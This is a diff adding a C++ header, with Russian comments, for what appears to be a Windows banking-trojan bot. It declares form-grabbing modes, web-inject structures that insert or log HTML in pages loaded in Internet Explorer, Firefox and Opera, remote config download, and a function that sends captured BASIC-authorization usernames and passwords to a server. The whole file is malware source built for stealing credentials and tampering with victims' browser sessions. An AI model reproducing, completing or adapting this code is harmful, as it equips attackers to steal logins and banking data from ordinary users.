@@ -1,0 +1,230 @@
+// -----------------------------------------------------------------------------
+
+#ifndef BotConfigH
+#define BotConfigH
+// -----------------------------------------------------------------------------
+
+#include <windows.h>
+#include "Requests.h"
+#include "BotClasses.h"
+#include "Requests.h"
+
+// флаг L, грабит кусок текста
+#define MODE_GETTEXT_GET  1   //LG
+#define MODE_GETTEXT_POST 2   //LP
+#define MODE_GETTEXT_ALL  3   //GPL или L
+
+// без флага, замена текста
+#define MODE_SETTEXT_GET  4  //G
+#define MODE_SETTEXT_POST 5  //P
+#define MODE_SETTEXT_ALL  6  //GP
+
+#define VERB_IS_POST hmGET
+#define VERB_IS_GET  hmPOST
+
+#define MAX_POST_DATA_SIZE 5000
+#define MIN_POST_DATA_SIZE 5
+
+#define PAGE_READED_FLAG 0x01
+#define PAGE_IS_INJECT   0x05
+
+#define INJECT_STATE_NONE	 0x01
+#define INJECT_STATE_ALREADY 0x02
+
+// Типы браузеров
+#define BROWSER_TYPE_IE		1  /* Internet Explorer */
+#define BROWSER_TYPE_FF		2  /* Mozilla Firefox */
+#define BROWSER_TYPE_O		3  /* Opera */
+
+// Типы отправляемых на сервер данных
+#define DATA_TYPE_FORMGRAB	1  /* Отправляемые данные являются данными HT<L формы */
+#define DATA_TYPE_INJECT	2  /* Данные являются куском HTML документа */
+
+#define FGRHOSTFROMCFG		1
+#define GRAHOSTFROMCFG		2
+#define SCRHOSTFROMCFG		3
+#define SNIHOSTFROMCFG		4
+#define PLUGINSHOSTFROMCFG	5
+
+// Описание сессии загрузки HTML документа
+typedef struct THTTPSessionInfo{
+	DWORD BrowserType;  /* Тип браузера */
+	PCHAR UserAgent;    /* Имя браузера */
+	PCHAR URL;          /* Адрес загружаемого ресурса */
+} *PHTTPSessionInfo;
+
+
+
+DWORD GetConfigTimeOut();
+char* GetCurrentHostFromConfig(int Num);
+void GetCurrentConfigHostSetings(bool*http, bool*https);
+
+
+//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+//
+//  Методы для работы с конфигурационным файлом бота
+//
+//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+enum TInjectDataState {idsUnknown, idsOk, idsError};
+
+typedef struct THTMLInjectData
+{
+	PCHAR Before;
+	PCHAR After;
+	PCHAR Inject;
+	TInjectDataState State;
+	bool Disabled;     // Не использовать инжект (Для отладочной программы)
+    LPVOID Source;     // Данные с которых были дублированы
+	LPVOID Owner;      // Указатель на инжект владелец данных
+}*PHTMLInjectData;
+
+
+//---------------------------------------------------------
+//  THTMLInject - описание данных для внедрения своего
+//                    HTML кода в загружаемые страницы
+//---------------------------------------------------------
+typedef struct THTMLInject
+{
+	PCHAR URL;       // Маска сайта для которого необходимо обрабатывать страницы
+	bool GET; 		 // Обрабатывать GET запросы
+	bool POST;       // Обрабатывать POST запросы
+	bool IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
+	PList Injects;   // Список инэектов (список элементов типа PHTMLInject)
+    PCHAR Comment;   // Коментарий к инжекту, только для редактора
+	bool Disabled;   // Не использовать инжект (Для отладочной программы)
+    bool Used;       // Признак того что маска использовалась
+	LPVOID Source;   // Инжект с которого данный инжект скопирован
+} *PHTMLInject;
+
+
+//---------------------------------------------------------
+// TBotConfig -  Настройки работы бота
+//---------------------------------------------------------
+typedef struct TBotConfig
+{
+	PList HTMLInjects; // Список инжектов (список элементов типа PHTMLInject)
+	PRTL_CRITICAL_SECTION Lock;
+} *PBotConfig;
+
+
+
+//*********************************************************
+//  AddHTMLInject - Добавить новый HTML инжект в список
+//		List. Если указан источник Source то в новый
+//		будут скопированы все его данные
+//*********************************************************
+PHTMLInject AddHTMLInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);
+
+
+//*********************************************************
+//  AddHTMLInjectData - Добавить новые данные инжекта
+//                      Добавлять данные инжекта, только
+//						этой функцией
+//*********************************************************
+PHTMLInjectData AddHTMLInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);
+
+
+//*********************************************************
+//  ClearHTMLInjectList - Функция рчищает список содержащий
+//						  элементы типа THTMLInject
+//*********************************************************
+void ClearHTMLInjectList(PList List);
+
+//*********************************************************
+//  Методы уничтожения данных HTML инжекта
+//*********************************************************
+void FreeHTMLInject(PHTMLInject Inject);
+
+
+//*********************************************************
+//  GetInjectsForRequest - Получить инжекты для запроса
+//*********************************************************
+bool GetInjectsForRequest(PRequest Request);
+
+//*********************************************************
+//  HandleHTMLinjects - Обработать HTML инжекты.
+//
+//  Результат - функция возвращает истину если в буффер
+//              запроса были внесены изменения
+//*********************************************************
+bool HandleHTMLinjects(PRequest Request, PHTTPSessionInfo Session);
+
+//*********************************************************
+//  ResetHTMLInjectsStatus - сбросить статус инжектов
+//*********************************************************
+void ResetHTMLInjectsStatus(PList Injects);
+
+
+//*********************************************************
+//  SetHTMLInjectEvent - установить метод обработки
+//		событий HTML инжекта
+//*********************************************************
+// Метод, событие HTML инжекта
+enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
+typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
+								LPVOID Sender, 	    	// источник события
+								THTMLInjectEventID ID,  // Идентификатор события
+                                LPVOID Reserver);      	// Зарезервировано
+
+void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
+
+
+namespace Config
+{
+	//*********************************************************
+	//	Initialize - Инициализировать глобальные
+	//  	настройки бота. Если указао имя файла FileName то
+	//  	настройки будут прочитаны из него, в противном
+	//  	случае настройки будут прочитаны из файла вшитого
+	//		в код бота.
+	//*********************************************************
+	PBotConfig Initialize(PWCHAR FileName = NULL, bool DontLoad = false);
+
+	// Функция возвращает указатель на конфиг бота
+	PBotConfig GetConfig();
+
+	// Очистить конфиг
+	void Clear(PBotConfig Config);
+
+	//  Функция возврашает имя файла по умолчанию
+	PWCHAR GetFileName();
+
+	//  Функция устанавливает имя файла по умолчанию
+	void SetFileName(PWCHAR FileName);
+
+	// Загрузить конфиг
+	bool Download(PCHAR URL);
+
+}
+
+
+//****************************************************************************
+//	HTMLInjects - Методы для работы с HTML инжектами
+//****************************************************************************
+namespace HTMLInjects
+{
+	// Функция возвращает истину если данные можно использовать в инжектах
+    bool IsValidInjectData(PHTMLInjectData Data);
+}
+
+
+// Функция отправляет на сервер данные BASIC авторизации
+void SendBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);
+
+
+
+// Функция возвращает истину если в инжекте включен режим отправки
+// блоков HTML кода на удалённый сервер
+//bool IsLogHTMLMode(PINJECTDATA Inject);
+
+// Функция возвращает истину если в инжекте включен режим вставки
+// блоков HTML кода в загруженные данные
+//bool IsInjectHTMLMode(PINJECTDATA Inject);
+
+// Функция возвращает истину если указанный тип контента
+// поддерживается методами инжекта HTML
+bool SupportContentType(PCHAR CType);
+
+// -----------------------------------------------------------------------------
+#endif
